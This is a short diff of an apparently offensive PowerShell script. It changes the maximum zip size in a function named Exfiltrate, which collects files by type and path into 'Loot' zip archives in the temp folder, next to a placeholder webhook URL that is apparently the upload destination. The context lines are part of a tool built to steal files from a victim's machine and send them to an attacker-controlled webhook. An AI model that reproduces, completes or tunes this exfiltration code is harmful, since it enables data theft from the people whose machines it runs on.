@@ -26,7 +26,7 @@ $hookurl = "WEBHOOK_HERE"
 Function Exfiltrate {
 
 param ([string[]]$FileType,[string[]]$Path)
-$maxZipFileSize = 25MB
+$maxZipFileSize = 10MB
 $currentZipSize = 0
 $index = 1
 $zipFilePath ="$env:temp/Loot$index.zip"
